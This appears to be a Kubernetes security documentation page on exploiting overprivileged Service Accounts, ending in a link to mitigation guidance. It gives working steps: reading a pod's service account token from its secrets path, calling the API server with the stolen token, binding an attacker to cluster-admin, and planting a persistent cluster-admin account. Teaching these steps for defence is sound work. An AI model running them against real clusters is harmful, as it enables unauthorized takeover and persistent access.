---
sidebar_position: 13
title: "Privileged Service Accounts"
description: "How attackers exploit overly privileged Kubernetes Service Accounts to gain cluster-wide access and escalate privileges."
---

# Privileged Service Accounts

Kubernetes **Service Accounts (SAs)** are used by pods to authenticate against the Kubernetes API. When overprivileged or misconfigured, they can be exploited by attackers to **escalate privileges, gain unauthorized access, and persist within the cluster**.

---

## Exploitation Steps: Abusing Overprivileged Service Accounts

An attacker targets insecure or overly permissive Service Accounts to compromise cluster security.

### 1. Enumerate Service Accounts and Roles

The attacker identifies all existing Service Accounts:

```bash
kubectl get serviceaccounts --all-namespaces
```

Then inspects associated role bindings:

```bash
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[].kind=="ServiceAccount")'
```

They look for accounts with elevated roles like `cluster-admin`.

---

### 2. Extract a Service Account Token

The attacker identifies a pod using a high-privilege Service Account and extracts its token:

```bash
kubectl exec -it attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

They decode and use it to access the Kubernetes API:

```bash
export TOKEN=<stolen-token>
curl -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/pods
```

This enables **API access with elevated privileges**.

---

### 3. Escalate Privileges via RBAC Misconfigurations

If the Service Account has rights to create role bindings, the attacker escalates access:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: escalate-privileges
  namespace: default
subjects:
  - kind: User
    name: attacker
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

```bash
kubectl apply -f escalate-privileges.yaml
```

This grants the attacker **cluster-admin rights**.

---

### 4. Establish Persistence via New Service Account

The attacker creates a new Service Account:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: persistent-access
  namespace: default
```

And binds it to `cluster-admin`:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: persist-access
subjects:
  - kind: ServiceAccount
    name: persistent-access
    namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

This ensures **continued access**, even if their original access is revoked.

---

### Result

The attacker successfully **exploits Service Account misconfigurations** to:

- **Access the Kubernetes API**
- **Escalate to cluster-admin**
- **Maintain persistent access to the cluster**

---

## Mitigation

➡ [Securing Kubernetes Service Accounts](/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/service_account_mitigation)
